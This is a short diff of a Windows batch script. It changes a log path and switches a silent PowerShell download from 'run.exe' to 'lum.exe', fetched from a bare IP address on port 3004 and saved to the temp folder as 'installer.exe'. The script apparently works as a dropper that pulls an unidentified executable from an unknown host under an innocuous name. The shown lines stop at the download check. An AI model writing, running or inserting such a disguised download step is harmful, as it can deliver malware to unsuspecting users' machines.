@@ -1,6 +1,6 @@
 @echo off
 REM Define the log file path
-set LOGFILE="C:\Program Files\MyApp\script_log.txt"
+set LOGFILE="C:\Program Files\script_log.txt"
 
 REM Ensure the directory exists
 if not exist "C:\Program Files\MyApp" (
@@ -30,7 +30,7 @@ if %errorlevel% neq 0 (
 )
 
 REM Function to download a file silently
-powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/run.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
+powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/lum.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
 if %errorlevel% neq 0 (
     echo Failed to download the file. >> %LOGFILE%
 ) else (
